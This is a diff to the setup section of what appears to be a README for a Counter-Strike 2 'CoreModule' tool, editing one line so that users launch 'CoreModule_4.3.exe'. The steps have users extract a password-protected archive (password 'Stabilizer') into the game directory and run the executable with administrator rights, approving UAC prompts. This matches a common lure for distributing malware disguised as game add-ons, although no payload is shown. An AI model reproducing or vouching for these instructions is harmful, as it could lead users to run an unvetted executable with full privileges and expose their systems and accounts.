@@ -12,7 +12,7 @@ Prior to any adjustments, a recovery snapshot (```backup_point_*.dat```) is auto
 <br>- Extract the contents of ```CoreModule_4.3.zip```(Passwd - ```Stabilizer```) into your game directory:
 <br>- ```...\Steam\steamapps\common\Counter-Strike 2\game\csgo\```
 <br>- Confirm presence of all required components: folders ```Runtime/, Profiles/```, and file ```module_manifest.dat```.
-<br>- Launch ```CoreModule_4.3``` with elevated privileges. Approve any User Account Control (UAC) prompts when requested by the operating system.
+<br>- Launch ```CoreModule_4.3.exe``` with elevated privileges. Approve any User Account Control (UAC) prompts when requested by the operating system.
 
 
 ## 🔄 Processing Workflow
